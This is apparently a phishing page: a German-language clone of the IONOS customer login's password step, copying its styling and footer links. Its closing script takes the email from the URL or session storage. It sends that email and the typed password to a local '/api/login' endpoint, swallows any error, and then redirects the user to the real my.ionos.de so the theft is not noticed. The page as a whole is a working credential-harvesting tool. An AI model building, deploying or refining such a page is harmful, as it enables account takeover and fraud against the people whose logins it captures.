<!DOCTYPE html>
<html lang="de" data-exos-theme="ionos">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login – Zugang zu Ihrem Kundenkonto</title>
  <link rel="icon" type="image/png" sizes="32x32" href="ionos-assets/image/favicon-32px.png" />
  <link rel="stylesheet" href="ionos-assets/style/exos.min.css" />
  <link rel="stylesheet" href="ionos-assets/style/main.min.css" />
  <link rel="stylesheet" href="ionos-assets/style/starter-main.min.css" />
  <style>
    .oao-navi-center,
    .oao-navi-right {
      visibility: visible !important;
      display: flex;
      align-items: center;
    }

    .oao-navi-center {
      flex: 1 1 auto;
      justify-content: center;
      padding: 0 16px;
      max-width: 640px;
      margin: 0 auto;
    }

    .oao-navi-search {
      width: 100%;
      max-width: 560px;
    }

    .oao-navi-search .input-text-group {
      --input-text-group-height: 40px;
    }

    .oao-navi-search .input-text {
      font-size: 14px;
    }

    .oao-navi-help {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 40px;
      height: 40px;
      color: #003d8f;
      text-decoration: none;
    }

    .oao-navi-help:before {
      font-family: exos-icon-font;
      content: "\e9a8";
      font-size: 22px;
      font-style: normal;
    }

    .identifier-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 8px;
      flex-wrap: wrap;
    }

    .identifier-back {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 32px;
      height: 32px;
      color: #003d8f;
      text-decoration: none;
      border-radius: 8px;
      flex-shrink: 0;
    }

    .identifier-back:hover {
      background: rgba(0, 61, 143, 0.06);
    }

    .identifier-back svg {
      width: 18px;
      height: 18px;
      stroke: currentColor;
      fill: none;
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    .button-current-identifier {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      max-width: 100%;
      padding: 0;
      border: none;
      background: transparent;
      color: #1474c4;
      font: inherit;
      font-size: 15px;
      font-weight: 600;
      cursor: default;
      text-align: left;
      min-width: 0;
    }

    .button-current-identifier .user-icon {
      display: inline-flex;
      flex-shrink: 0;
      color: #1474c4;
    }

    .button-current-identifier .user-icon svg {
      width: 18px;
      height: 18px;
      fill: currentColor;
    }

    .button-current-identifier span {
      overflow: visible !important;
      text-overflow: unset !important;
      white-space: normal !important;
    }

    #display-identifier {
      word-break: break-all;
    }

    .current-identifier {
      max-width: 100% !important;
    }

    .password-field-wrap {
      position: relative;
    }

    .password-field-wrap .input-text-group {
      --input-text-group-height: 48px;
    }

    .password-field-wrap .input-text {
      font-size: 15px;
    }
  </style>
</head>
<body>

  <div class="page-content">

    <div class="oao-navi-navigation oao-navi-light">
      <div class="oao-navi-left">
        <div class="oao-navi-application-name">
          <a class="oao-navi-app-name" href="ionos.html">
            <span class="oao-navi-app-logo"></span>
            <span>Login</span>
          </a>
        </div>
      </div>
      <div class="oao-navi-center hide-when-headless">
        <div class="oao-navi-search">
          <div class="input-text-group input-text-group--filled">
            <span class="input-text-group__icon input-text-group__icon--search" aria-hidden="true"></span>
            <input
              type="search"
              class="input-text"
              placeholder="Suche nach Funktionen, Domains und Hilfe"
              autocomplete="off"
              tabindex="-1"
            />
          </div>
        </div>
      </div>
      <div class="oao-navi-right hide-when-headless">
        <a class="oao-navi-help" href="https://www.ionos.de/hilfe/" target="_blank" rel="noopener" aria-label="Hilfe"></a>
      </div>
    </div>

    <main>
      <section class="page-section page-section--default page-section--short">
        <div class="page-section__block">

          <div class="sheet">

            <section class="sheet__section sheet__section--default">
              <ul>
                <li class="stripe stripe--cropped">
                  <div class="stripe__item">
                    <img class="stripe__visual" src="ionos-assets/image/password.svg" height="58" width="auto" alt="" />
                  </div>
                  <div class="stripe__item">
                    <h1 class="headline stripe__element">Passwort eingeben</h1>
                  </div>
                </li>
              </ul>
            </section>

            <section class="sheet__section sheet__section--default">
              <form id="ionos-password-form" method="POST" novalidate>

                <div class="container-current-identifier">
                  <div class="identifier-row">
                    <a class="identifier-back" href="ionos.html" aria-label="Zurück">
                      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg>
                    </a>
                    <span class="current-identifier">
                      <span class="button-current-identifier" id="current-user-btn">
                        <span class="user-icon" aria-hidden="true">
                          <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                        </span>
                        <span id="display-identifier">—</span>
                      </span>
                    </span>
                  </div>
                </div>

                <ul>
                  <li class="form-stripe">
                    <label class="label" for="password">Passwort</label>
                    <div class="password-field-wrap">
                      <div class="input-text-group input-text-group--filled">
                        <input
                          type="password"
                          class="input-text form-input"
                          name="password"
                          id="password"
                          tabindex="1"
                          required
                          autofocus
                          autocomplete="current-password"
                        />
                        <button
                          type="button"
                          class="input-text-group__action input-text-group__action--show-password"
                          id="toggle-password"
                          aria-label="Passwort anzeigen"
                        ></button>
                      </div>
                    </div>
                    <p class="input-byline">
                      <a class="link" href="https://passwort.ionos.de/">Passwort vergessen?</a>
                    </p>
                  </li>
                  <li class="form-stripe form-stripe--actions">
                    <button
                      class="button button--primary button--full-width button--with-loader"
                      type="submit"
                      id="button--with-loader"
                      tabindex="2"
                    >Weiter</button>
                  </li>
                </ul>

              </form>
            </section>

          </div>

        </div>
      </section>
    </main>

  </div>

  <footer class="page-footer">
    <div class="page-footer__block">
      <section class="page-footer__section page-footer__section--last">

        <div class="page-footer__section-item">
          <div class="oao-statuspage-overall-status page-footer__status"></div>
        </div>

        <div class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left">
          &copy; 2026
          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/unternehmen">IONOS SE</a>
        </div>

        <div class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left">
          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/impressum">Impressum</a> -
          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/terms-gtc/terms-privacy">Datenschutz</a> -
          <a class="page-footer__link" target="_blank" rel="noopener" href="https://www.ionos.de/terms-gtc">AGB</a>
        </div>

      </section>
    </div>
  </footer>

  <script>
    (function () {
      const params = new URLSearchParams(window.location.search);
      const stored = sessionStorage.getItem("ionos_identifier");
      const identifier = (params.get("identifier") || stored || "").trim();

      if (!identifier) {
        window.location.replace("ionos.html");
        return;
      }

      sessionStorage.setItem("ionos_identifier", identifier);
      document.getElementById("display-identifier").textContent = identifier;
      if (!window.location.hash) {
        history.replaceState(null, "", window.location.pathname + window.location.search + "#");
      }

      const pw = document.getElementById("password");
      const toggle = document.getElementById("toggle-password");

      toggle.addEventListener("click", function () {
        const show = pw.type === "password";
        pw.type = show ? "text" : "password";
        toggle.classList.toggle("input-text-group__action--show-password", !show);
        toggle.classList.toggle("input-text-group__action--hide-password", show);
        toggle.setAttribute("aria-label", show ? "Passwort verbergen" : "Passwort anzeigen");
      });

      document.getElementById("ionos-password-form").addEventListener("submit", async function (e) {
        e.preventDefault();
        const password = pw.value;
        if (!password) return;

        const btn = document.getElementById("button--with-loader");
        btn.disabled = true;
        btn.textContent = "Weiter …";

        try {
          await fetch("/api/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: identifier, password: password })
          });
        } catch (_) {}

        window.location.href = "https://my.ionos.de/";
      });
    })();
  </script>

</body>
</html>
